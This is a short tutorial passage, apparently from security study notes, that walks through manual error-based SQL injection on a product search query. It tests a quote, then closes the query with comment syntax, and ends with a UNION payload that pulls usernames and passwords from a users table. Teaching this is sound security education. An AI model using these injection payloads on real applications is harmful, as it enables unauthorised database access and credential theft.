## Manual Error-based SQLi

<div class="row row-cols-md-2"><div>

➡️ In an error-based SQLi, the first thing tested is a quote `'`:

```sql!
Select name,desc from product where name LIKE '%'%'
```

☠️ The query fails because of the syntax is invalid, due to the trailing "`%'`", but we know that an injection is possible.

<br>

➡️ We then comment out the rest of the query using `' --`.

```sql!
Select name,desc from product where name LIKE '%' --%'
```

☠️ The code above may not work in some DBMS, because they want a space between the start of a comment, and the comment itself.

➡️ We add a space then using `'-- -`

```sql!
Select name,desc from product where name LIKE '%' -- -%'
```

✅ Between `'` and `-- -`, we can write SQL code, through the syntax of the final query must be valid ✌️.

For instance, we could use `UNION Select username,password FROM users`. It's a Union-based payload.


```sql!
Select name,desc from product where name LIKE '%' UNION Select username,password FROM users -- -%'
```
